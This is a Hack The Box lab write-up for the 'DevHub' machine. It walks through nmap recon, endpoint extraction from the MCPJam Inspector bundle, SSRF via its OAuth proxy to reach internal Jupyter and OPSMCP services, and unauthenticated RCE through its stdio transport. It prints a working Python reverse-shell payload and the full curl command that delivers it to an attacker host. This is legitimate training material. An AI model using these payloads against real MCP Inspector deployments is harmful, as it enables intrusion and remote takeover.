---
tags:
  - SN_11
link: https://app.hackthebox.com/machines/DevHub
description: Medium·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8e821c7bbdb90d8520bb597edae70080.png
date: 2026-06-06
pawned: true
machine no.: 2
---
## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
└─$ ping -c 4 10.129.245.216
PING 10.129.245.216 (10.129.245.216) 56(84) bytes of data.
64 bytes from 10.129.245.216: icmp_seq=1 ttl=63 time=214 ms
64 bytes from 10.129.245.216: icmp_seq=2 ttl=63 time=207 ms
64 bytes from 10.129.245.216: icmp_seq=3 ttl=63 time=211 ms
64 bytes from 10.129.245.216: icmp_seq=4 ttl=63 time=206 ms

--- 10.129.245.216 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3004ms
rtt min/avg/max/mdev = 206.041/209.497/213.890/3.075 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 5000 -Pn 10.129.245.216
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:51 -0400
Nmap scan report for 10.129.245.216
Host is up (0.32s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nmap -A -p 22,80,6274 10.129.245.216       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-09 10:55 -0400
Nmap scan report for 10.129.245.216
Host is up (0.22s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Tue, 09 Jun 2026 14:56:07 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Tue, 09 Jun 2026 14:56:08 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=6/9%Time=6A282988%P=x86_64-pc-linux-gnu%r(Get
SF:Request,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credentials
SF::\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20c
SF:harset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Tue,\x2009\x20Jun\x202026\x
SF:2014:56:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<h
SF:tml\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\
SF:"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/s
SF:vg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20nam
SF:e=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\"
SF:\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x2
SF:0\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-D
SF:RYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x2
SF:0crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>\
SF:n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20</
SF:body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content\
SF:r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-me
SF:thods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent-
SF:type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Tue,\x2009\x20Jun\x20
SF:2026\x2014:56:08\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest
SF:,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credenti
SF:als:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DELE
SF:TE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset=
SF:UTF-8\r\nDate:\x20Tue,\x2009\x20Jun\x202026\x2014:56:08\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/
SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSSt
SF:atusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2
SF:0close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConne
SF:ction:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x
SF:20Request\r\nConnection:\x20close\r\n\r\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.63 ms 10.10.14.1
2   223.76 ms 10.129.245.216

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.30 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port     | Service | Version                    | Analysis                                                                                              |
| -------- | ------- | -------------------------- | ----------------------------------------------------------------------------------------------------- |
| 22/tcp   | SSH     | OpenSSH 8.9p1 Ubuntu       | Standard Ubuntu SSH — not directly exploitable; target for persistence once credentials/keys obtained |
| 80/tcp   | HTTP    | nginx/1.18.0               | Redirects to `devhub.htb`; informational landing page listing internal services                       |
| 6274/tcp | HTTP    | Node.js (MCPJam Inspector) | Debug tool for MCP protocol — public-facing, no authentication; high-value attack surface             |

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

Command: `sudo vi etc/hosts`

**Breakdown:**

- `sudo` 
	- Description: Elevated Privileges
	- Purpose: Required to modify system-level configuration files like the hosts database.
- `vi` 
	- Description: Terminal Text Editor
	- Purpose: Used to append the `TARGET_IP devhub.htb` entry to the file.
- `/etc/hosts` 
	- Description: Static Host Lookup Table
	- Purpose: The local file that takes precedence over DNS servers, ensuring the domain resolves to the CTF machine.


Subdomain — a DNS concept. It's just a hostname that sits under a parent domain.
- admin.devhub.htb is a subdomain of devhub.htb
- It exists in DNS (or your hosts file) and points to an IP

Virtual host — a web server concept. It's a config block on nginx/Apache that says "serve this content when you see this hostname."


The relationship:

A subdomain is how you reach a virtual host. A virtual host is what handles the request when you arrive.

admin.devhub.htb  →  DNS resolves to 10.129.245.216  →  nginx vhost config for admin.devhub.htb  →  serves admin panel
devhub.htb        →  DNS resolves to 10.129.245.216  →  nginx vhost config for devhub.htb        →  serves main page

Same IP, same server, two subdomains, two virtual hosts.


They don't have to go together though:

- A subdomain can point to a completely different server with its own IP — no virtual hosting involved at all. mail.google.com and drive.google.com likely hit different infrastructure entirely.
- A virtual host doesn't have to be a subdomain — devhub.htb and devhub-admin.htb are two different domains (not subdomains of each other) but could both be virtual hosts on the same server.


In CTF/HTB context the terms get used loosely — when people say "enumerate vhosts" they usually mean "find hidden subdomains that are configured as virtual hosts on the same box." Both words are involved, but the technique is fuzzing the Host: header to discover which hostnames the server responds to differently.
<div align="center">
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://devhub.htb`.

![[Pasted image 20260609193242.png]]

- Title: DevHub - Internal Development Platform
- Confirms this is meant to be an internal-only page, not public-facing
- Copyright: 2026 DevHub Team - For Internal Use Only
- **Key finding:** The landing page explicitly advertises internal services.
- Three Service Cards:

| Service             | Status                         | Details                                                                          |
| ------------------- | ------------------------------ | -------------------------------------------------------------------------------- |
| MCP Inspector       | Active — Port 6274             | Externally reachable, used for building/testing MCP servers                      |
| Analytics Dashboard | Internal Only — localhost:8888 | Jupyter-based, restricted to analyst team                                        |
| Code Repository     | Maintenance Mode               | Internal Git server — no port exposed, meaning it's either down or fully hidden. |

- Tech Stack (bottom of page): `Node.js` `Python 3` `Jupyter` `MCP Protocol` `Ubuntu 24.04`
	This is a gift from a pentesting perspective — the app is openly advertising exactly what's running on the server.

What This Tells an Attacker:
- Port 6274 could be the entry point - it's the only thing marked active and externally accessible
- localhost:8888 is the prize behind it — Jupyter running as a restricted user, only reachable from inside the machine (SSRF target)
- Git repo exists somewhere — even in maintenance mode, git repos can contain credentials, commit history, config files
- Python 3 + Jupyter means code execution is possible if you can authenticate to Jupyter
- Ubuntu 24.04 narrows down kernel exploits and tells you what tools are likely installed


View Page Source:

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DevHub - Internal Development Platform</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); min-height: 100vh; color: #eee; }
        .container { max-width: 1200px; margin: 0 auto; padding: 40px 20px; }
        header { text-align: center; margin-bottom: 60px; }
        header h1 { font-size: 3rem; color: #00d9ff; margin-bottom: 10px; }
        header p { font-size: 1.2rem; color: #888; }
        .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
        .service-card { background: rgba(255,255,255,0.05); border-radius: 15px; padding: 30px; border: 1px solid rgba(255,255,255,0.1); transition: transform 0.3s, box-shadow 0.3s; }
        .service-card:hover { transform: translateY(-5px); box-shadow: 0 10px 40px rgba(0,217,255,0.2); }
        .service-card h3 { color: #00d9ff; margin-bottom: 15px; font-size: 1.4rem; }
        .service-card p { color: #aaa; line-height: 1.6; }
        .service-card .status { margin-top: 15px; padding: 8px 15px; border-radius: 20px; display: inline-block; font-size: 0.85rem; }
        .status.active { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
        .status.internal { background: rgba(255, 193, 7, 0.2); color: #ffc107; }
        footer { text-align: center; margin-top: 60px; color: #555; }
        .tech-stack { margin-top: 40px; text-align: center; }
        .tech-stack span { display: inline-block; background: rgba(255,255,255,0.1); padding: 8px 16px; border-radius: 20px; margin: 5px; font-size: 0.9rem; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>DevHub</h1>
            <p>Internal Development & Analytics Platform</p>
        </header>
        
        <div class="services">
            <div class="service-card">
                <h3>MCP Inspector</h3>
                <p>Model Context Protocol development and debugging tool. Used by the dev team for building and testing MCP servers.</p>
                <span class="status active">Active - Port 6274</span>
            </div>
            
            <div class="service-card">
                <h3>Analytics Dashboard</h3>
                <p>Jupyter-based analytics environment for data processing and visualization. Access restricted to analyst team.</p>
                <span class="status internal">Internal Only - localhost:8888</span>
            </div>
            
            <div class="service-card">
                <h3>Code Repository</h3>
                <p>Internal Git server for version control and collaboration. Project documentation and deployment scripts.</p>
                <span class="status internal">Maintenance Mode</span>
            </div>
        </div>
        
        <div class="tech-stack">
            <span>Node.js</span>
            <span>Python 3</span>
            <span>Jupyter</span>
            <span>MCP Protocol</span>
            <span>Ubuntu 24.04</span>
        </div>
        
        <footer>
            <p>&copy; 2026 DevHub Team - For Internal Use Only</p>
        </footer>
    </div>
</body>
</html>
```

You can use Dev Tools to check network requests (Everything the browser fetched to load the page shows up there — HTML, CSS, JavaScript files, images, API calls, fonts, etc.)

In our case only 2 things loaded:
- `devhub.htb` — the main HTML page itself
- `config.json` — a separate file the page requested automatically

![[Pasted image 20260609193823.png]]

The application appears intentionally minimal:

- No authentication form
- No search functionality
- No visible API endpoints
- No user-controlled input
<div align="center">
<br>
<br>
</div>

#### 2.2.3 MCPJam

During our nmap service scan we found port `6274` open with an unknown service. The fingerprint response contained an HTML title — `MCPJam Inspector` — which immediately told us what was running. Navigating to http://10.129.245.216:6274 in the browser confirms it, presenting a single-page application (SPA): a clean React interface with connection controls, a tool list panel, and an execution console.

![[Pasted image 20260610000713.png]]
<div align="center">
<br>
</div>

##### What is MCP?

MCP stands for Model Context Protocol, an open standard created by Anthropic (the company behind Claude). Its purpose is to give AI assistants a structured way to connect to external tools and services — essentially giving the AI hands.

On its own an AI can only work with text. MCP changes that. Through MCP an AI can read files, query databases, call APIs, and run commands. The way it works is through MCP servers — small programs that expose a set of callable functions called "tools." An AI connects to an MCP server, asks what tools are available, and can then invoke them. A simple MCP server might expose tools like read_file, run_query, or list_services.
<div align="center">
<br>
<br>
</div>

##### What is MCPJam Inspector?

MCPJam is an organisation building tooling around the MCP ecosystem. Their Inspector is one specific tool. Developers use it to:

- Connect to an MCP server they're building
- See what tools it exposes
- Call those tools and inspect the responses
- Debug why something isn't working

It's a React frontend backed by a Node.js process. The Node.js backend is what actually makes connections to MCP servers on behalf of the browser UI.

The critical thing to understand about Inspector is that it was designed as a localhost developer tool — something you run on your own machine, for your own use, with no one else able to reach it. On DevHub it is exposed on a public port with no authentication. That single misconfiguration turns two legitimate developer features into attack primitives:

- Its proxy functionality (built to help developers reach remote OAuth endpoints) becomes an SSRF vector
- Its stdio transport (built to launch and communicate with local MCP server processes) becomes unauthenticated remote code execution

A tool that is perfectly safe on localhost becomes a critical vulnerability the moment it faces the internet.
<div align="center">
<br>
<br>
</div>

#### 2.2.4 MCPJam Inspector — JS Bundle Extraction

The next step is extracting the JavaScript bundle to find hidden API endpoints.

Here's the reasoning behind it:

MCPJam Inspector is a React single-page application (SPA). When you load it in the browser, the server sends one large JavaScript file that contains the entire application logic — all the UI code, all the API calls it makes, every endpoint it communicates with. This is just how SPAs work, everything has to be shipped to the browser to run.

The important thing is that string literals in JavaScript cannot be hidden. If the code makes a call to `/api/mcp/connect`, that string has to exist in the bundle exactly as-is for the HTTP request to work. You can minify and compress JavaScript but you cannot encrypt it — the browser has to be able to read and execute it.

So the process is:
<div align="center">
<br>
</div>

##### 1. Find the bundle filename:

**Command:** `curl -s http://TARGET_IP:6274/`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.129.245.216:6274/                       
<!doctype html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>MCPJam Inspector</title>
    <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
    <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
  </head>
  <body>
    <div id="root"></div>
  </body>
</html>
```

This pulls the page source and the bundle filename is confirmed as `/assets/index-DRYhT9Xb.js`.
<div align="center">
<br>
</div>

##### 2. Fetch the bundle and extract all quoted paths

**Command:** `curl -s http://TARGET_IP:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u`

This fetches the actual JavaScript bundle file using the filename you just found, then extracts every quoted string that looks like a URL path.

**Breakdown:**

- `grep -Eo '"/[a-zA-Z0-9/_-]+"'` — Extract all double-quoted strings beginning with a forward slash (API path convention in JavaScript). `-E` enables extended regex, `-o` prints only matching text.
- `sort -u` — Deduplicate the results.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s http://10.129.245.216:6274/assets/index-DRYhT9Xb.js | grep -Eo '"/[a-zA-Z0-9/_-]+"' | sort -u
"//"
"/api/apps/chatgpt/widget/store"
"/api/chat"
"/api/mcp/apps/widget/store"
"/api/mcp/chat"
"/api/mcp/chat-v2"
"/api/mcp-cli-config"
"/api/mcp/connect"
"/api/mcp/elicitation/respond"
"/api/mcp/elicitation/stream"
"/api/mcp/evals/generate-negative-tests"
"/api/mcp/evals/generate-tests"
"/api/mcp/evals/run"
"/api/mcp/evals/run-test-case"
"/api/mcp/export/server"
"/api/mcp/list-tools"
"/api/mcp/log-level"
"/api/mcp/oauth/debug/proxy"
"/api/mcp/oauth/proxy"
"/api/mcp/prompts/get"
"/api/mcp/prompts/list"
"/api/mcp/prompts/list-multi"
"/api/mcp/resources/list"
"/api/mcp/resources/read"
"/api/mcp/resource-templates/list"
"/api/mcp/servers"
"/api/mcp/servers/reconnect"
"/api/mcp/tasks/cancel"
"/api/mcp/tasks/capabilities"
"/api/mcp/tasks/get"
"/api/mcp/tasks/list"
"/api/mcp/tasks/progress"
"/api/mcp/tasks/result"
"/api/mcp/tokenizer/count-text"
"/api/mcp/tools/execute"
"/api/mcp/tools/list"
"/api/mcp/tools/respond"
"/array/"
"/authorize"
"/callback"
"/config"
"/e"
"/e/"
"/evals"
"/evals/create"
"/oauth/callback/debug"
"/path/to/node"
"/person/"
"/project/"
"/properties"
"/register"
"/replay/"
"/static/"
"/token"
"/user_management/authenticate"
"/user_management/sessions/logout"
```

**Key finding:** Two critical endpoints stand out:
- `/api/mcp/oauth/proxy` - SSRF vector(an OAuth proxy ripe for SSRF abuse) and 
- `/api/mcp/connect` - RCE vector(a connection endpoint that accepts `stdio` transport configuration, meaning it can spawn arbitrary processes).
<div align="center">
<br>
<br>
</div>

#### 2.2.5 SSRF — Probing Internal Services via `/api/mcp/oauth/proxy`

We start with the SSRF because it's lower risk and gives us reconnaissance inside the server before we go for a shell. The goal is to use the server as a proxy to reach internal services that we can't access directly from outside.

**Theory Block — Why the OAuth Proxy is SSRF:**
The `/api/mcp/oauth/proxy` endpoint exists to forward OAuth token exchange requests to remote authorization servers on behalf of the Inspector UI. This pattern is common in MCP tooling: the backend makes the outbound HTTP call so the frontend doesn't face CORS restrictions. When the `url` parameter is controllable and the server applies no allowlist validation, the endpoint becomes a full SSRF primitive — the server will fetch any URL, including `http://127.0.0.1:*` localhost services the attacker cannot reach directly.

What we already know to probe:

From the port 80 dashboard the page told us:
- Jupyter is running at `localhost:8888`
- The tech stack includes Python 3
<div align="center">
<br>
</div>

##### Probe Jupyter at `localhost:8888`

**Command:**

`curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:8888/api"}'`

**Breakdown:**

- `-X POST` — Use HTTP POST method, as the proxy endpoint expects request forwarding.
- `-d '{"url":"..."}'` — JSON body specifying the internal URL to proxy. The `127.0.0.1` address will be resolved server-side, bypassing external network restrictions.

**Result:**

```shell
kali@kali:~$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" \
  -H "Content-Type: application/json" \
  -d '{"url":"http://127.0.0.1:8888/api"}'
{"status":200,"statusText":"OK","headers":{"server":"TornadoServer/6.5.4","content-type":"application/json"},"body":{"version":"2.17.0"}}
```

**Key finding:** Jupyter 2.17.0 is running on `TornadoServer/6.5.4` at localhost:8888, and the SSRF is fully functional — the response body is proxied back in the JSON `body` field.
<div align="center">
<br>
</div>

##### What "SSRF is fully functional" means:

SSRF (Server-Side Request Forgery) means tricking the server into making HTTP requests on your behalf to places you can't reach directly.

When you sent that curl command you were essentially saying to the MCPJam server:

> "Make an HTTP request to `http://127.0.0.1:8888/api` and give me back whatever you get."

If the server refused, ignored the url parameter, or only allowed requests to external addresses — the SSRF would be blocked. You'd get an error or empty response.

But instead the server went ahead, made the request to its own `localhost:8888`, got a response from Jupyter, and sent that response back to you. That's what "fully functional" means — there are no restrictions on what URLs you can point it at.

How the response confirms it:

You got back something like:

```
{
  "status": 200,
  "body": {"version": "2.17.0"},
  "headers": {
    "server": "TornadoServer/6.5.4"
  }
}
```

Three things this confirms:

| What you see        | What it confirms                                                    |
| ------------------- | ------------------------------------------------------------------- |
| status: 200         | The server successfully reached localhost:8888                      |
| version: 2.17.0     | That's Jupyter's API responding                                     |
| TornadoServer/6.5.4 | The web framework Jupyter runs on — fingerprints the exact software |

If you had tried this from your own Kali machine directly: `curl http://10.129.245.216:8888/api`
You'd get nothing — port 8888 isn't exposed externally. But the MCPJam server reached it because it's on the same machine. You used MCPJam as a proxy to see inside the server's internal network.

That's the SSRF. You can now reach anything on localhost that you couldn't touch before.
<div align="center">
<br>
</div>

##### Probe Flask at `localhost:5000`

**Command:**

`curl -s -X POST "http://TARGET_IP:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'`

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ curl -s -X POST "http://10.129.245.216:6274/api/mcp/oauth/proxy" -H "Content-Type: application/json" -d '{"url":"http://127.0.0.1:5000/"}'   
{"status":200,"statusText":"OK","headers":{"connection":"close","content-length":"150","content-type":"application/json","date":"Tue, 09 Jun 2026 21:57:30 GMT","server":"Werkzeug/3.1.6 Python/3.10.12"},"body":{"auth":"Required - X-API-Key header","endpoints":["/tools/list","/tools/call","/health"],"server":"OPSMCP","status":"operational","version":"2.1.0"}} 
```

**Key finding:** A second internal service — OPSMCP 2.1.0 on Werkzeug/Flask — is running at localhost:5000. Its index response reveals three endpoints and that an `X-API-Key` header is required for authentication.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>


### 2.3 Vulnerability Research & Analysis

| Service | Version | Vulnerability Class | Notes |
|---------|---------|--------------------|----|
| MCPJam Inspector `/api/mcp/oauth/proxy` | 1.4.2 | SSRF (no allowlist) | Full internal network access via proxied HTTP requests |
| MCPJam Inspector `/api/mcp/connect` | 1.4.2 | Unauthenticated RCE via stdio transport | Spawns arbitrary OS processes as the service user |
| Jupyter Lab | 2.17.0 | Token exposed in `ps aux` (process argument) | Tokens visible to all users with process listing rights |
| OPSMCP | 2.1.0 | Hidden tool with no secondary authorization | `ops._admin_dump` not in `/tools/list` but callable; reads `/root/.ssh/id_rsa` |

The stdio transport vulnerability in `/api/mcp/connect` is the most critical — MCP stdio transport works by spawning a child process and communicating with it over stdin/stdout using JSON-RPC. The Inspector accepts a `serverConfig` object with a `command` and `args` array, passing them directly to `child_process.spawn()` without any validation. Sending a Python reverse shell as the `command`/`args` results in immediate code execution as the `mcp-dev` service account.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation — Initial Access

### 3.1 Exploit Acquisition and Preparation

No external exploit required. The attack surface map from JS bundle extraction provides two direct paths:

1. **SSRF via `/api/mcp/oauth/proxy`** — confirmed working; used for service reconnaissance and later to enumerate OPSMCP.
2. **RCE via `/api/mcp/connect` stdio transport** — the Inspector expects a `serverConfig` JSON object with `type: "stdio"`, `command`, and `args`. Substituting a Python reverse shell for a legitimate MCP server command triggers OS command execution.

Reverse shell payload constructed:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

This inline Python was inlined into the `args` array of the JSON payload.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Exploitation Execution

#### 3.2.1 Start a netcat listener to catch the reverse shell

**Command:** `nc -lvnp 4444` (on attacker)

**Breakdown:**

- `nc` — Netcat utility for raw TCP connections.
- `-l` — Listen mode.
- `-v` — Verbose output, prints connection details.
- `-n` — No DNS resolution, avoiding delays.
- `-p 4444` — Bind to port 4444.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.2 Send the Payload

**Command:**

```
curl -s -X POST http://10.129.245.216:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"type":"stdio","command":"python3","args":["-c","import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.85\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])"]},"serverId":"revshell"}'
```

**Breakdown:**

- `"type":"stdio"` — Tells MCPJam Inspector to use the stdio transport, which spawns a subprocess.
- `"command":"python3"` — The interpreter to execute; python3 is available on most Ubuntu systems.
- `"args":["-c","..."]` — The `-c` flag passes the Python one-liner as inline code. The shell command embedded connects back to the attacker's IP on port 4444 and redirects stdin/stdout/stderr over the socket.
- `"serverId":"revshell"` — An arbitrary identifier required by the API schema.

**Result:**

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.85] from (UNKNOWN) [10.129.245.216] 38030
bash: cannot set terminal process group (1078): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
```

Shell received as `mcp-dev` in the Inspector's working directory.
<div align="center">
<br>
